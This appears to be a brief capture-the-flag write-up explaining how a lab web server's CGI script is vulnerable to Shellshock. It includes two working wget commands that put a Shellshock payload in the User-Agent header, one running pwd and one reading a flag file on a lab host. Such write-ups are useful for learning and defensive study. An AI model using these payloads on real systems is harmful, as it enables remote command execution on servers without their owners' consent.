---
# Shellshock

As the name suggests this is probably a shellshock vulnerability. You can test for it below


# Test
```language-bash
wget -U "() { test;};echo \"Content-type: text/html\"; echo; echo; pwd;" http://10.10.10.54:8000/cgi-bin/board
```

Basically the webserver is vulnerable to executing bash commands on the server. This means that we can do normal bash commands. No privilege escalation is needed for this challenge.

Basically we want to keep changing our working directory until we find some file named flag.
When we do all we do is execute the below script

```language-bash
wget -U "() { test;};echo \"Content-type: text/html\"; echo; echo; cd cgi-bin; /bin/cat flag ;" http://10.10.10.54:8000/cgi-bin/board
```

[test]: https://raw.githubusercontent.com/mpaxson/ctf/master/H3-2016/shellshock/vulncheck.png

[result]: https://raw.githubusercontent.com/mpaxson/ctf/master/H3-2016/shellshock/vulnresult.png
